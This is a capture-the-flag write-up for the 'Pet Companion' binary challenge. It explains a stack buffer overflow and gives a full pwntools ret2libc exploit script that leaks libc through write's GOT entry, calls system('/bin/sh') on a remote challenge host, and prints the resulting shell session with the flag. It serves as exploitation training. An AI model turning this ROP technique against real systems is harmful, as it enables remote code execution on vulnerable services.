# Pet Companion

Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet's demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure.

## Writeup

This is the main function:

```c
undefined8 main(void)

{
  undefined8 buffer;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  buffer = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
  read(0,&buffer,256);
  write(1,"\n[*] Configuring...\n\n",0x15);
  return 0;
}
```

The buffer is of 8*8 dimension plus the **saved ebp** that is 8 bytes.

We need to **leak** the address of the **write** function.

To do so, need to use the **plt** and the **got** address, but we need some gadget to call the function.

The binary only have **pop rdi** and **pop rsi**:

```
0x0000000000400743 : pop rdi ; ret                        
0x0000000000400741 : pop rsi ; pop r15 ; ret  
```

So we don't use directly the third argument, need to use the value that is stored on **rdx** register for the size of buffer.

The first payload is used to leak the **write** function address:

```
b'A' * offset
pop_rdi
0x01    # stdout
pop_rsi_pop_r15
write_got
0x01  # junk for r15
write_plt
main    # call again main
```

Now we have the address of **write** function. Use it to bypass **ASLR** and send the second payload to pwn the binary:

```
b'A' * offset,
pop_rdi
bin_sh
system_addr
exit_addr
```

The final payload will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.63.46 --port 42734 pet_companion
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pet_companion')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if args['LOCAL']:
    libc = ELF('./glibc/libc.so.6', checksec=False) # Can be found via $ ldd exe
else:
    libc = ELF('./glibc/libc.so.6', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.63.46'
port = int(args.PORT or 42734)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'

io = start()

buffer_dim = 8*8
saved_ebp_dim = 8

offset = buffer_dim + saved_ebp_dim

main = exe.symbols['main']
write_plt = exe.plt['write']
write_got = exe.got['write']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload = [
    b'A' * offset,
    p64(pop_rdi),
    p64(0x01),
    p64(pop_rsi_pop_r15),
    p64(write_got),
    p64(0x01),  # junk for r15
    p64(write_plt),
    p64(main)
]

payload = b''.join(payload)

io.sendlineafter(b':', payload)

# Read the write address
io.recvuntil(b'Configuring...\n\n')
write_address = u64(io.read(8))

io.info(f'Write address: {hex(write_address)}')

libc.address = write_address - libc.symbols['write']

bin_sh = next(libc.search(b"/bin/sh\x00"))
system_addr = libc.symbols['system']
exit_addr = libc.symbols['system']

payload = [
    b'A' * offset,
    p64(pop_rdi),
    p64(bin_sh),
    p64(system_addr),
    p64(exit_addr)
]

payload = b''.join(payload)

io.sendlineafter(b':', payload)

io.interactive()
```

The flag is:

```bash
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ ls
core
flag.txt
glibc
pet_companion
$ cat flag.txt
HTB{c0nf1gur3_w3r_d0g}
```